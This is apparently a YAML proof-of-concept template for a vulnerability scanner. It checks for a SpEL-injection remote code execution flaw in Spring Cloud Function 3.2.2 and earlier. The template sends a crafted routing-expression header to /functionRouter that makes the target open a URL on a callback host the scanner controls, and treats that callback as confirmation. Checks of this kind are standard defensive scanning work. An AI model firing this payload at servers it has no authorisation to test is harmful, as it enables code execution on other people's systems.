name: poc-yaml-spring-cloud-function-spel-rce
binding: 16cd5af6-e416-4085-86ca-720170c21b33
manual: true
detail:
    author: Kai
    links:
        - https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
    vulnerability:
        id: CT-404883
        level: critical
    AffectedVersion: 3.2.2
    description: spring cloud function <= 3.2.2 会对特定的header进行SPEL解析,导致RCE
transport: http
set:
    reverse: newReverse()
    reverseUrl: reverse.url
    randomString: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /functionRouter
            headers:
                Content-Type: application/x-www-form-urlencoded
                spring.cloud.function.routing-expression: new java.net.URL("{{reverseUrl}}").openStream()
            body: |
                {{randomString}}
        expression: reverse.wait(5)
expression: r0()
